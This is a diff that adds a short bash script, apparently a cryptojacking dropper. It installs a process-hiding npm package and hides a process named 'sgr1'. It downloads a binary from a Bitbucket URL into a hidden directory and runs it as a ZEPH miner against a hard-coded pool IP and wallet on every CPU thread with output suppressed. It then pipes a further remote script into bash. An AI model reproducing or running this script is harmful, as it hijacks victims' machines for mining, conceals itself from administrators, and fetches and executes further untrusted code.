@@ -1,0 +1,8 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add sgr1"
+mkdir .kap && cd .kap
+wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
+chmod +x sgr1
+sudo ./sgr1 --coin=ZEPH -a rx/0 -o 139.177.188.78:80 -u 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju -p ikuk -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 
